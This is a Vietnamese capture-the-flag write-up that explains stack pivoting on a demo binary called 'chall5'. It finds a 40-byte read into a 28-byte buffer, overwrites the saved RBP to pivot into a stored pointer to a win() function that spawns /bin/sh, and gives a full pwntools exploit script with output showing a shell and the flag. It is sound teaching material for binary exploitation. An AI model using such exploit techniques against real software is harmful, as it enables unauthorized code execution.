# stackpivot_chall_demo_file

***Mục đích chính của kỹ thuật này là chuyển hướng luồng thực thi của chương trình bằng cách thay đổi con trỏ stack (RSP/ESP) sang một vùng nhớ mới mà chúng ta kiểm soát, từ đó thực thi các đoạn mã (thường là ROP chain) đã được đặt sẵn ở vùng nhớ đó.***

### Tại sao cần Stack Pivot?
1. **Không đủ không gian trên stack hiện tại**: Khi buffer quá nhỏ, không đủ để chứa toàn bộ ROP chain.
2. **Kiểm soát vùng nhớ mới**: Chúng ta có thể ghi dữ liệu lên các vùng nhớ khác (như heap, .bss) và muốn thực thi ROP chain từ đó.
3. **Bypass một số cơ chế bảo vệ**: Như ASLR, NX, Stack Canary (bằng cách tránh việc ghi đè lên stack ban đầu).

# File demo (`chall5`)
## Kiểm tra cơ chế bảo vệ
```bash
checksec chall5
```
```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
* No canary vì thế chúng ta có thể ghi đè return address
* No PIE : địa chỉ không bị random hóa

## Kiểm tra mã giả với IDA64
```bash
ida64 chall5
```
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[2]; // [rsp+Eh] [rbp-2h] BYREF

  init(argc, argv, envp);
  qword_404850 = (__int64)win;
  puts("Welcome human!");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        puts("1. Buy");
        puts("2. Sell");
        puts("3. Exit");
        printf("> ");
        read(0, buf, 2uLL);
        if ( buf[0] != 49 )
          break;
        buy();
      }
      if ( buf[0] != 50 )
        break;
      sell();
    }
    if ( buf[0] == 51 )
      break;
    puts("Invalid choice!");
  }
  puts("Thanks for coming!");
  return 0;
}
```
* Có thể thấy chương trình mô phỏng một menu với các lựa chọn `Buy`, `Sell`, `Exit`.
* Phát hiện hàm win được gán vào một con trỏ có địa chỉ `404850`, hàm này có thể tạo shell:
```
int win()
{
  return system("/bin/sh");
}
```
* Kiểm tra hàm `Buy`:
```
__int64 buy()
{
  __int64 result; // rax
  char buf[28]; // [rsp+0h] [rbp-20h] BYREF
  int v2; // [rsp+1Ch] [rbp-4h]

  v2 = 0;
  puts("1. Apple");
  puts("2. Banana");
  puts("3. Cambridge IELTS Volumn 4");
  printf("> ");
  v2 = read(0, buf, 0x28uLL);
  result = (unsigned __int8)buf[v2 - 1];
  if ( (_BYTE)result == 10 )
  {
    result = v2 - 1;
    buf[result] = 0;
  }
  return result;
}
```
- Tại đây chương trình khai báo biến `buf` chứa được 28 byte nhưng đọc vào 0x28 hexabyte (40 byte) vì vậy xảy ra buffer overflow.
## Khai thác
### Kiểm tra giá trị thanh ghi khi chương trình crash
* Thử nhập vào hàm `Buy` 40 byte, chương trình gặp lỗi `SIGBUS`:
```
Program received signal SIGBUS, Bus error.
```
* Nhận thấy giá trị RBP bị thay đổi nhưng RIP thì không, Nên luồng chương trình vẫn trờ về hàm main để tiếp tục. Tuy nhiên RBP được lấy ra là một địa chỉ không hợp lệ do đã bị ghi đè nên chương trình bị lỗi.
```
RBP  0x6161616161616165 ('eaaaaaaa')
RIP  0x401311 (main+123) ◂— movzx eax, byte ptr [rbp - 2]
```
* Do địa chỉ binary tĩnh nên ta nghĩ đến việc thay đổi RBP thành một giá trị hợp lệ 
```
vmmap
```
* Ta thấy từ địa chỉ 0x404000 tới 0x405000 có quyền rw, do là rbp -2 nên ta chọn sao cho khi thực thi không bị nhảy tới vùng nhớ trước nó.
```
0x404000           0x405000 rw-p     1000    3000 chall5
```
```bash
x/50xg 0x404000
```
* Chọn `0x404900`
### Tính offset
```bash
cyclic -l 0x6161616161616165
```
```
Found at offset 32
```
## SCRIPT
* Đặt input, debug động để xem giá trị RBP
```python
input()
p.sendlineafter(b'> ', b'1')
payload = b'A' * 32
payload += p64(0x404900)
```
* Giá trị RBP đã bị thay đổi
```
RBP  0x404900
```
* Đặt breakpoint tại lệnh read trong hàm `Buy` xem dữ liệu bị thay đổi.
```
rbp         0x7ffce1907cf0 —▸ 0x7ffce1907d10
```
* Ta thấy lúc này overwrite được rbp của hàm main, sau khi về hàm `main` thì rbp nhận giá trị mà ta đã overwrite.
* Địa chỉ hàm main chương trình đã cung cấp tại `0x404850`
* Vậy ta có script
```python
#!/usr/bin/python3

from pwn import *

exe = ELF("./chall5", checksec = False)

p = process(exe.path)

p.sendlineafter(b'> ', b'1')
payload = b'A' * 32
payload += p64(0x404848)

p.sendafter(b'> ', payload)
p.sendafter(b'> ', b'3')
p.interactive()
```

* Ở đây có thể thấy địa chỉ win() là 0x404850 mà tại sao lại nhập là 0x404848? –> Lý do là leave ; ret tương ứng với mov rsp, rbp ; pop rbp. Vì vậy ta phải nhảy vào 0x404848 (0x404850 -8) và sau khi ret sẽ là 0x404850. Và pop nó xảy ra alignment, nên phải nhảy vào địa chỉ ở trước win() chứ không phải vào win() luôn.
### Chạy thử
```bash
./solve5.py
```
```
[+] Starting local process '/mnt/c/Users/ASUS/Downloads/chall5': pid 111322
[*] Switching to interactive mode
Thanks for coming!
$ ls
chall5   Flag.txt
```
```
$ cat Flag.txt
WELL DONE! THIS IS YOUR FLAG: CTF{ISP_VO_DICH}$
```



